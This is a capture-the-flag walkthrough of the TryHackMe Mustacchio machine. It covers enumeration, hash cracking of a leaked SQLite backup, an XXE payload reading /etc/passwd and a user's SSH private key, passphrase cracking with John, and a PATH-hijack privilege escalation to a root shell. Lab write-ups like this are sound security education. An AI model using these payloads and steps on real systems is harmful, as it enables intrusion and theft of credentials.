Mustacchio Walkthrough | Try Hack Me | Ally¬†Petitt
==================================================

**Introduction**
================

Hey everyone! This is a write-up of how I was able to pwn the Mustacchio machine. I hope you enjoy!

Notes:¬†  
* This was done on a Kali Linux machine so the commands might be slightly different if you are on Windows

**Enumeration**
===============

To begin, I scanned for open ports using [RustScan](https://github.com/RustScan/RustScan). RustScan, for those who have never heard of it, is essentially a much faster version of Nmap. You can use Nmap if you prefer. My results were as follows:

`PORT STATE SERVICE REASON VERSION  
22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)  
80/tcp open http syn-ack Apache httpd 2.4.18 ((Ubuntu))  
| http-robots.txt: 1 disallowed entry¬†  
|_/  
| http-methods:¬†  
|_ Supported Methods: GET HEAD POST OPTIONS  
|_http-server-header: Apache/2.4.18 (Ubuntu)  
|_http-title: Mustacchio | Home  
8765/tcp open http syn-ack nginx 1.10.3 (Ubuntu)  
|_http-server-header: nginx/1.10.3 (Ubuntu)  
|_http-title: Mustacchio | Login  
| http-methods:¬†  
|_ Supported Methods: GET HEAD POST  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

As shown by this scan, there are 3 ports open. I investigated the website on port 80 first. I looked through the source code, checked for cookies, looked for linked javascript files, and tested the contact form for cross-site scripting. I found nothing interesting, so I continued to do directory enumeration using [FFUF](https://github.com/ffuf/ffuf) (you can also use Wfuzz, Gobuster, or DirBuster for this part).

`ffuf -u <http://10.10.93.193/FUZZ> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

<img class="graf-image" data-height="80" data-image-id="1*erwnChNmTvF8tXrU6r_S-Q.png" data-width="663" src="https://cdn-images-1.medium.com/max/800/1*erwnChNmTvF8tXrU6r_S-Q.png"/>

The custom directory looks interesting. I noticed it earlier when I was looking at the linked JavaScript files. Let‚Äôs investigate.

<img class="graf-image" data-height="287" data-image-id="1*V_As8mpAktOxs0GjknBnAw.png" data-is-featured="true" data-width="433" src="https://cdn-images-1.medium.com/max/800/1*V_As8mpAktOxs0GjknBnAw.png"/>

And we have access to these files! I went inside the JavaScript file and found a file called users.bak. I downloaded the file and ran the strings command on it.

`$ strings users.bak¬†  
SQLite format 3  
tableusersusers  
CREATE TABLE users(username text NOT NULL, password text NOT NULL)  
]admin1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`

From this file, we have learned that they are using SQLite 3 to store their users. Now, we have a way to view the admin user in their database. Great! Before we go deeper into this, I‚Äôd like to explore the other web server running on port 8765.

<img class="graf-image" data-height="949" data-image-id="1*tmf5emcwConOrADGYV4Veg.png" data-width="1920" src="https://cdn-images-1.medium.com/max/800/1*tmf5emcwConOrADGYV4Veg.png"/>

How great is this! We found the admin panel where we can log in as admin. Let‚Äôs see if we can get the admin credentials using the users.bak file.

Exploitation
============

After a few Google searches, I found out how to open this file. I used the SQLite3 CLI:

`$ sqlite3 users.bak  
SQLite version 3.36.0 2021‚Äì06‚Äì18 18:36:39  
Enter ‚Äú.help‚Äù for usage hints.  
sqlite>¬†.tables  
users  
sqlite>¬†.dump users  
PRAGMA foreign_keys=OFF;  
BEGIN TRANSACTION;  
CREATE TABLE users(username text NOT NULL, password text NOT NULL);  
INSERT INTO users VALUES(‚Äòadmin‚Äô,‚Äô1868e36a6d2b17d4c2745f1659433a54d4bc5f4b‚Äô);  
COMMIT;`

And there is the password hash that we found when we initially used the strings command on users.bak üòÇ. I tried to use my best buddy John for help, but he failed me today. Instead, I resorted to hashcat to crack the password.

`$ hashcat -m 100¬†./hash /usr/share/wordlists/rockyou.txt`

<img class="graf-image" data-height="817" data-image-id="1*n3kLAAUq1LNmS2DrlBHwcA.png" data-width="1166" src="https://cdn-images-1.medium.com/max/800/1*n3kLAAUq1LNmS2DrlBHwcA.png"/>

And we have our password! With the newfound credentials `admin:bulldog19` I logged into the admin console on port 8765. Success! The credentials worked.

<img class="graf-image" data-height="945" data-image-id="1*0UmbX55dZohkB-gKgPoRBw.png" data-width="1920" src="https://cdn-images-1.medium.com/max/800/1*0UmbX55dZohkB-gKgPoRBw.png"/>

While looking at the page source, two things immediately stand out to me.

1. I see a comment left by the developer
2. The name of the input box is ‚Äúxml‚Äù

<img class="graf-image" data-height="686" data-image-id="1*0tRlE5e6aAO2JQcOEZREOw.png" data-width="1773" src="https://cdn-images-1.medium.com/max/800/1*0tRlE5e6aAO2JQcOEZREOw.png"/>

When I try press submit without writing anything in the textarea, I am greeted by the following alert:

<img class="graf-image" data-height="981" data-image-id="1*cD5Mov3ZH_r2YjtzfLoX3w.png" data-width="1920" src="https://cdn-images-1.medium.com/max/800/1*cD5Mov3ZH_r2YjtzfLoX3w.png"/>

Interesting. Maybe we can submit our own XML code to perform a reverse shell. One of the [most common XML vulnerabilities](https://gist.github.com/mgeeky/4f726d3b374f0a34267d4f19c9004870) is an XML Eternal Entity (XXE) injection, so let‚Äôs test for it in this application! I used the XXE payload from this [blog post](https://cybarrior.com/blog/2019/11/28/xml-external-entity-xxe-injection-payload-list/):

`<?xml version=‚Äù1.0" encoding=‚ÄùUTF-8"?>  
<!DOCTYPE comment [<!ENTITY xee SYSTEM ‚Äú/etc/passwd‚Äù> ]>  
<comment>  
¬†<com>&xee;</com>  
</comment>`

When I type this in the text area and press ‚ÄúSubmit‚Äù, I see the following on my screen:

<img class="graf-image" data-height="949" data-image-id="1*XQySYPmpIgWDqkmlXyx_Ag.png" data-width="1920" src="https://cdn-images-1.medium.com/max/800/1*XQySYPmpIgWDqkmlXyx_Ag.png"/>

Success! This application is vulnerable to XXE injection. Let‚Äôs use this vulnerability to get our first flag.

User.txt
========

Here, we can see Barry as a user on this machine. Recalling that we found a comment regarding his SSH key in the source code, maybe we can find his private key to gain SSH access to this server. To do this, I looked inside his¬†.ssh folder inside his home directory. I simply changed `/etc/passwd` to `/home/barry/.ssh/id_rsa` as "id\_rsa" is a common name for the file containing a private ssh key.

<img class="graf-image" data-height="948" data-image-id="1*yEC5KVva_GVYWI45nKBEfg.png" data-width="1920" src="https://cdn-images-1.medium.com/max/800/1*yEC5KVva_GVYWI45nKBEfg.png"/>

Success! We can now see Barry‚Äôs private SSH key. If we were to directly copy-paste this from the webpage we would have formatting issues. Instead, I inspected the page and copied the key from the HTML. I then pasted it into a file called ‚Äúid\_rsa\_barry‚Äù, **making sure that there is no white space**. I changed the permissions on the file using this command:

`chmod 400 id_rsa_barry`

I went to ssh into the machine and this was my result:

<img class="graf-image" data-height="91" data-image-id="1*mGKSvT93JzuxBhgxAvxBIg.png" data-width="461" src="https://cdn-images-1.medium.com/max/800/1*mGKSvT93JzuxBhgxAvxBIg.png"/>

It seems that we need a passphrase. The passphrase should be within the private SSH key file, which we can crack using John.

`$ python3 /usr/share/john/ssh2john.py id_rsa_barry > id_rsa_barry.hash  
¬†$ john‚Ää‚Äî‚Ääwordlist=/usr/share/wordlists/rockyou.txt id_rsa_barry.hash`

<img class="graf-image" data-height="208" data-image-id="1*DFe8cHaY9rABFQoOAkr-iA.png" data-width="717" src="https://cdn-images-1.medium.com/max/800/1*DFe8cHaY9rABFQoOAkr-iA.png"/>

Great! Now we have the passphrase to use. I used the same ssh command from before to log in and entered the passphrase that I just found. And we are in.

<img class="graf-image" data-height="448" data-image-id="1*RBrrcp7EVvjb9szz2tLUGg.png" data-width="717" src="https://cdn-images-1.medium.com/max/800/1*RBrrcp7EVvjb9szz2tLUGg.png"/>

Privilege Escalation
====================

First, I took a look at Barry‚Äôs id.

`barry@mustacchio:~$ id  
uid=1003(barry) gid=1003(barry) groups=1003(barry)`

It appears that he is not in any groups that we could use for privilege escalation. I also used `sudo -l` to see if there are any commands that we can run as root without a password. This turned out not to be the case. Then, I checked for any SUID binaries. These are files that can run with root privileges.


```
barry@mustacchio:~$ find / -perm -4000 2>/dev/null  
/usr/lib/x86\_64-linux-gnu/lxc/lxc-user-nic  
/usr/lib/eject/dmcrypt-get-device  
/usr/lib/policykit-1/polkit-agent-helper-1  
/usr/lib/snapd/snap-confine  
/usr/lib/openssh/ssh-keysign  
/usr/lib/dbus-1.0/dbus-daemon-launch-helper  
/usr/bin/passwd  
/usr/bin/pkexec  
/usr/bin/chfn  
/usr/bin/newgrp  
/usr/bin/at  
/usr/bin/chsh  
/usr/bin/newgidmap  
/usr/bin/sudo  
/usr/bin/newuidmap  
/usr/bin/gpasswd  
**/home/joe/live\_log**  
/bin/ping  
/bin/ping6  
/bin/umount  
/bin/mount  
/bin/fusermount  
/bin/su
```
Interesting, ‚Äúlive\_log‚Äù is in Joe‚Äôs home directory. Maybe we have permission to execute it.

`barry@mustacchio:~$ cd /home/joe && ls -la  
total 28  
drwxr-xr-x 2 joe joe 4096 Jun 12 2021¬†.  
drwxr-xr-x 4 root root 4096 Jun 12 2021¬†..  
-rwsr-xr-x 1 root root 16832 Jun 12 2021 live_log`

And we do! When I run it, it appears to launch an application.

<img class="graf-image" data-height="547" data-image-id="1*4UbZ77EZp3aHOXEHYvNonQ.png" data-width="730" src="https://cdn-images-1.medium.com/max/800/1*4UbZ77EZp3aHOXEHYvNonQ.png"/>

This isn‚Äôt very useful to us because we can‚Äôt interact with the application! Instead, I looked further into the file using the `strings` command. Additionally, I used `awk` so that we would only see the long strings that are more likely to be helpful. If nothing useful came out, then I would lower the minimum string length from 15 characters to 10 and so on because the output can often be very long.

`$ strings live_log | awk ‚Äòlength($0) > 15‚Äô`

<img class="graf-image" data-height="469" data-image-id="1*8nyN1k4x9nZpM1sGpDmSsg.png" data-width="583" src="https://cdn-images-1.medium.com/max/800/1*8nyN1k4x9nZpM1sGpDmSsg.png"/>

Interesting. There is a path to ‚Äúaccess.log‚Äù and the full path for the `tail` command isn‚Äôt used. Maybe we can change the PATH variable so that we can use our own ‚Äútail‚Äù command that gives us root.

`$ export PATH=/tmp  
$ cd /tmp  
$ echo ‚Äú/bin/bash -p‚Äù > tail  
$ /bin/chmod +x tail  
$ /home/joe/live_log  
# /usr/bin/whoami  
root  
# /bin/cat /root/root.txt  
[REDACTED]`

And it works! Since ‚Äúlive\_log‚Äù was an SUID binary, we were able to run it as root. We were able to redirect the path from `/usr/bin/tail` to `/tmp/tail` which allowed us to run `/bin/bash` as root, giving us a root shell.

That‚Äôs all! I hope you enjoyed my explanations. Please send me any constructive feedback [via LinkedIn](https://www.linkedin.com/in/ally-petitt-5a02aa208/). Thank you and take care!
